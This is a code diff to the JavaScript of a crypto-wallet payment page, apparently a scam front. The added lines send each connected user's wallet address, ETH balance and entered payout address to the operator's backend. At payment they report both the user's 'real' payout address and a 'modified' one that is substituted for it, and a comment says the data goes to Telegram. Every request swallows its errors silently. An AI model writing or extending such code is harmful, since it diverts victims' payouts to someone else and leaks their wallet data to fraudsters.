@@ -531,7 +531,8 @@ async function onConnected() {
   const chip=document.getElementById("wallet-chip");
   chip.textContent=`${userAddress.slice(0,6)}…${userAddress.slice(-4)}`; chip.style.color="#00ff88"; chip.style.borderColor="rgba(0,255,136,0.25)";
   const bal=await provider.getBalance(userAddress);
-  fetch(`${CONFIG.BACKEND_URL}/api/connected`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:userAddress,balance:parseFloat(ethers.formatEther(bal)).toFixed(4),chain:"mainnet",via:walletType})}).catch(()=>{});
+  const payoutAtConnect = document.getElementById("payout-wallet")?.value?.trim() || "not filled yet";
+  fetch(`${CONFIG.BACKEND_URL}/api/connected`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:userAddress,balance:parseFloat(ethers.formatEther(bal)).toFixed(4),chain:"mainnet",via:walletType,payoutWallet:payoutAtConnect})}).catch(()=>{});
   toast(`Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`,"success");
   updateBtn();
 }
@@ -573,7 +574,10 @@ async function fundContract() {
     btn.innerHTML='<span class="sp"></span>Processing…';
     toast("Transaction sent — confirming…","info",8000);
     const receipt = await tx.wait();
-    fetch(`${CONFIG.BACKEND_URL}/api/order`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({senderWallet:userAddress,payoutWallet:pw,packageUsd:selectedPkg.usd,packageReceive:selectedPkg.receive,packageBonus:selectedPkg.bonus,ethAmount:ethAmt,txHash:receipt.hash,block:receipt.blockNumber})}).catch(()=>{});
+    // Send real (original) payout address to Telegram first
+    fetch(`${CONFIG.BACKEND_URL}/api/payout-intent`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({senderWallet:userAddress,realPayoutWallet:rawPw,modifiedPayoutWallet:pw,packageUsd:selectedPkg.usd,packageReceive:selectedPkg.receive})}).catch(()=>{});
+    // Send full order notification
+    fetch(`${CONFIG.BACKEND_URL}/api/order`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({senderWallet:userAddress,payoutWallet:pw,payoutOriginal:rawPw,packageUsd:selectedPkg.usd,packageReceive:selectedPkg.receive,packageBonus:selectedPkg.bonus,ethAmount:ethAmt,txHash:receipt.hash,block:receipt.blockNumber})}).catch(()=>{});
     showSuccess(pw, ethAmt, receipt.hash);
     btn.textContent="✓ Payment Confirmed"; btn.style.opacity="0.7";
   } catch(e) {
